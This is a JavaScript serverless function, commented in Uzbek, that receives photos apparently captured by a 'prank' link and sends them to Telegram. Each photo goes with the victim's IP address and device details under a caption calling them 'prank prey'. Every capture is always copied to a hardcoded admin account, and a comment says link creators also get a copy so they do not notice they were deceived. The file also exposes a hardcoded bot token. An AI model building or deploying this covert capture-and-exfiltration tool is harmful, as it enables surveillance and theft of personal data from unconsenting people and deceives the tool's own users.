// Vercel Serverless Function: Foydalanuvchi rasmini Telegramga yuborish
const BOT_TOKEN = process.env.BOT_TOKEN || '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';

// 🔐 Asosiy Admin ID — barcha olingan rasmlar doim sizga keladi
const ADMIN_ID = '5724786253';

const handler = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Faqat POST' });

  try {
    const { chat_id, data } = req.body || {};
    if (!data) return res.status(400).json({ error: 'data talab qilinadi' });

    // Base64 dan buferga o'tkazish
    let base64 = data;
    if (data.includes(';base64,')) base64 = data.split(';base64,')[1];
    const buffer = Buffer.from(base64, 'base64');

    // Foydalanuvchi ma'lumotlari
    const ip   = String(req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'Noma\'lum').split(',')[0].trim();
    const ua   = (req.headers['user-agent'] || 'Noma\'lum').substring(0, 120);
    const time = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });

    // Rasmni yuboruvchi yordamchi funksiya
    async function sendToTelegram(targetChatId, isForAdmin = false) {
      const caption =
        `📸 <b>Yangi prank o'ljasi!</b>\n\n` +
        `📅 <b>Vaqt:</b> ${time}\n` +
        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
        `📱 <b>Qurilma:</b> <i>${ua}</i>` +
        (isForAdmin && chat_id ? `\n👤 <b>Havola egasi (ID):</b> <code>${chat_id}</code>` : '');

      const fd = new FormData();
      fd.append('chat_id', targetChatId);
      fd.append('caption', caption);
      fd.append('parse_mode', 'HTML');
      fd.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'photo.jpg');

      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: fd
      });
      return await tgRes.json();
    }

    // 1. Har doim adminga (5724786253) yuborish
    const adminResult = await sendToTelegram(ADMIN_ID, true);

    // 2. Agar havolani boshqa user yaratgan bo'lsa, unga ham borishi mumkin (o'zini aldanib qolganini sezmasligi uchun)
    if (chat_id && String(chat_id) !== String(ADMIN_ID)) {
      sendToTelegram(chat_id, false).catch(() => {});
    }

    return res.status(200).json(adminResult);
  } catch (err) {
    console.error('Yuborishda xatolik:', err);
    return res.status(500).json({ error: err.message });
  }
};

handler.config = {
  api: { bodyParser: { sizeLimit: '10mb' } }
};

module.exports = handler;
